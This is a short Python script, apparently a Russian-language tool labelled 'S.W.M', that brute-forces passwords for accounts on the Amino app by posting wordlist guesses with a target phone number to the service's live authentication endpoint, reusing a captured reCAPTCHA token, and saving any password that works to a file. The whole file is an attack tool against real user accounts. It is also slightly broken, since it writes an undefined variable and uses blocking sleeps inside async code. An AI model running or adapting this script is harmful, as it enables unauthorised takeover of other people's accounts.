import configparser
import aiohttp
import time
import asyncio

config = configparser.ConfigParser()
config.read("settings.ini")

async def brute(password, phone):
    while True:
        for word in password:
            word = str(word).replace('\n','')
            jsonData = {'recaptcha_challenge':config["system"]["recaptcha_challenge"],'recaptcha_version':config["system"]["recaptcha_version"],'auth_type':0,'secret':word, 'phoneNumber':phone}
            async with aiohttp.ClientSession() as session:
                async with session.post('https://aminoapps.com/api/auth', json=jsonData) as resp:
                    r = await resp.json()
                    time.sleep(0.5)
                    try:
                        if 'nickname' in r['result'] or 'title' in r['result']:
                            passwordFound = open('password_result.txt','w+')
                            passwordFound.write(f'{email}:{word}\n')
                            passwordFound.close()
                            print(f'[S.W.M] -- > Пароль найден!\n\n[S.W.M] -- > Пароль: {str(word)}')
                            return False
                        else:
                            print(f'[S.W.M] Пароль {str(word)} не подошёл.')
                    except KeyError:
                        pass